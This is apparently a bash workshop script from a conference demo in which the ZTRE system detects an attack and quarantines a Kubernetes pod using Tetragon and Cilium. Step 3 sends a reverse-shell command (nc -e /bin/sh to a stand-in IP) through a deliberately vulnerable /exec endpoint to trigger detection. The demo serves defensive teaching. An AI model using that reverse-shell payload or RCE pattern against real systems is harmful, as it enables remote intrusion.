#!/usr/bin/env bash
# workshop/attack-demo.sh — Trigger attack and watch quarantine in real-time
# Run this AFTER setup-minikube.sh completes
#
# This demonstrates the full kernel-to-serverless path:
#   1. Attacker hits vulnerable-web /exec endpoint
#   2. Tetragon eBPF detects sys_execve of /bin/sh → nc
#   3. ZTRE Agent receives event, scores risk → RED zone
#   4. Agent patches pod label → Cilium drops all traffic
#   5. (Optional) Agent webhook → Cloud Run → Gemini AI triage

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

CLUSTER_NAME="ztre-workshop"
MINIKUBE_IP=$(minikube -p "$CLUSTER_NAME" ip 2>/dev/null) || {
    echo -e "${RED}Cluster $CLUSTER_NAME not running. Run setup-minikube.sh first.${NC}"
    exit 1
}

pause() {
    echo ""
    echo -e "${CYAN}  ▶ Press Enter to continue...${NC}"
    read -r
}

clear
echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════════════╗"
echo "  ║   ZTRE Live Attack Demo — Kernel-to-Serverless              ║"
echo "  ║   Cloud DevFest Surabaya '26                                ║"
echo "  ╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── Pre-attack state ──────────────────────────────────────────────────
echo -e "${BOLD}Step 1: Pre-attack state${NC}"
echo -e "${GREEN}Pod status before attack:${NC}"
kubectl get pods -n ztre-test -L ztre/quarantine -o wide
echo ""
echo -e "${GREEN}No quarantine label present. Pod is serving traffic normally.${NC}"
pause

# ── Verify vulnerable-web is reachable ────────────────────────────────
echo -e "${BOLD}Step 2: Verify target is alive${NC}"
echo -e "${YELLOW}curl http://${MINIKUBE_IP}:30080/healthz${NC}"
curl -s "http://${MINIKUBE_IP}:30080/healthz" || echo "(connection failed — check NodePort)"
echo ""
pause

# ── Simulate attack ──────────────────────────────────────────────────
echo -e "${BOLD}Step 3: 🔴 Attacker executes reverse shell via RCE${NC}"
echo -e "${RED}Simulating: curl /exec?cmd=nc -e /bin/sh 198.51.100.1 4444${NC}"
echo ""
echo -e "${YELLOW}This triggers:${NC}"
echo "  1. Tetragon eBPF hooks sys_execve in kernel"
echo "  2. Detects: vulnerable-web → /bin/sh → nc (reverse shell pattern)"
echo "  3. ZTRE Agent scores: Severity=100, Context=100, Asset=25 → Score=80 (RED)"
echo "  4. Agent patches pod label: ztre.io/status=quarantined"
echo "  5. Cilium instantly drops ALL ingress+egress traffic"
echo ""
echo -e "${RED}Firing attack...${NC}"

# nc won't connect (no listener at 198.51.100.1), but the exec of /bin/sh + nc
# is what Tetragon detects. The 5s timeout prevents curl from hanging.
curl -s --max-time 5 \
    "http://${MINIKUBE_IP}:30080/exec?cmd=nc%20-e%20/bin/sh%20198.51.100.1%204444" \
    2>/dev/null || true

echo ""
echo -e "${YELLOW}Attack fired. Waiting 3 seconds for ZTRE response chain...${NC}"
sleep 3

# ── Show quarantine result ────────────────────────────────────────────
echo ""
echo -e "${BOLD}Step 4: Post-attack state${NC}"
echo -e "${GREEN}Pod status after attack:${NC}"
kubectl get pods -n ztre-test -L ztre/quarantine -o wide
echo ""

# Check if label was applied
POD_NAME=$(kubectl get pods -n ztre-test -l app=vulnerable-web -o jsonpath='{.items[0].metadata.name}')
LABEL=$(kubectl get pod -n ztre-test "$POD_NAME" -o jsonpath='{.metadata.labels.ztre/quarantine}' 2>/dev/null || echo "")

if [[ "$LABEL" == "true" ]]; then
    echo -e "${GREEN}✅ Pod quarantined! Label ztre/quarantine=true applied.${NC}"
    echo -e "${GREEN}✅ Cilium has dropped all network traffic to/from this pod.${NC}"
    echo -e "${GREEN}✅ Container is STILL RUNNING (PID 1 intact) — forensics preserved.${NC}"
else
    echo -e "${YELLOW}⏳ Label not yet applied. Check agent logs:${NC}"
    echo "  kubectl logs -n ztre-system -l app.kubernetes.io/name=ztre-agent --tail=20"
fi
echo ""
pause

# ── Show network isolation proof ──────────────────────────────────────
echo -e "${BOLD}Step 5: Verify network isolation${NC}"
echo -e "${YELLOW}Attempting to reach quarantined pod:${NC}"
curl -s --max-time 3 "http://${MINIKUBE_IP}:30080/healthz" 2>/dev/null \
    && echo -e "${RED}⚠ Pod still reachable (Cilium policy may need time)${NC}" \
    || echo -e "${GREEN}✅ Connection refused/timed out — network isolation confirmed!${NC}"
echo ""
pause

# ── Show pod is still alive ───────────────────────────────────────────
echo -e "${BOLD}Step 6: Forensic preservation proof${NC}"
echo -e "${YELLOW}Pod container status (should be Running, restart=0):${NC}"
kubectl get pod -n ztre-test "$POD_NAME" -o jsonpath='{
  "Phase: "}{.status.phase}{"\n"}{
  "Restart Count: "}{.status.containerStatuses[0].restartCount}{"\n"}{
  "Container Running: "}{.status.containerStatuses[0].state.running.startedAt}{"\n"}'
echo ""
echo -e "${GREEN}Process is alive. Memory, /proc, network sockets all inspectable.${NC}"
echo -e "${GREEN}This is the key ZTRE difference: isolate, don't kill.${NC}"
pause

# ── Agent logs ────────────────────────────────────────────────────────
echo -e "${BOLD}Step 7: ZTRE Agent decision log${NC}"
kubectl logs -n ztre-system -l app.kubernetes.io/name=ztre-agent --tail=10 \
    | grep -E "CONTAINMENT|AUTO_CONTAINMENT|risk_score|quarantine" || echo "(no containment log lines found yet)"
echo ""

# ── Summary ───────────────────────────────────────────────────────────
echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════════════╗"
echo "  ║   Demo Complete                                             ║"
echo "  ║                                                             ║"
echo "  ║   Kernel:     Tetragon eBPF detected shell + nc execution   ║"
echo "  ║   Agent:      Risk scored 80+ → AUTO_CONTAINMENT            ║"
echo "  ║   Datapath:   Cilium dropped all traffic via label match    ║"
echo "  ║   Serverless: Cloud Run webhook (optional) → AI triage      ║"
echo "  ║   Forensics:  Container alive, memory intact, zero SIGKILL  ║"
echo "  ╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${YELLOW}Reset for another demo run:${NC}"
echo "  kubectl label pod -n ztre-test $POD_NAME ztre/quarantine-"
echo "  kubectl rollout restart deployment/vulnerable-web -n ztre-test"
